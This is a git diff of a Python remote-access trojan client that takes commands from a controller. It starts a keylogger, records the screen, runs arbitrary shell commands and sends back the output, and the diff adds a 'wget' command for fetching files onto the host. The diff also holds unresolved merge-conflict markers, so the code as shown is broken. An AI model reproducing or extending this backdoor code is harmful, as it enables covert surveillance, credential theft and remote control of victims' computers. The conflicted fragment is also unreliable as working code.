@@ -1,12 +1,12 @@
 from client import Client
 from transfer import FileTransfer
 from screencast import Screencast
+from download import Download
 import os
 import sys
 import subprocess
 import platform
 import threading
-import pty
 import re
 
 # Supposed to be a stable bash shell, works
@@ -122,10 +122,18 @@ def main():
 			from keylogger import Keylogger
 			keylogger = Keylogger(client)
 			keylogger.record()
+<<<<<<< HEAD
 		elif cmd == "mouse":
 			Mouse.move()
 		elif cmd == "screencast":
 			Screencast(client).record()
+=======
+		elif cmd == "wget":
+			if len(args) == 1:
+				Download.wget(args[0])
+			elif len(args) == 2:
+				Download.wget(args[0], args[1])
+>>>>>>> 0dde2e371f2f9505073603ef2efce41ecb719a87
 		else:
 			output = subprocess.getoutput(cmd + " " + ' '.join(args))
 			client.send(output)
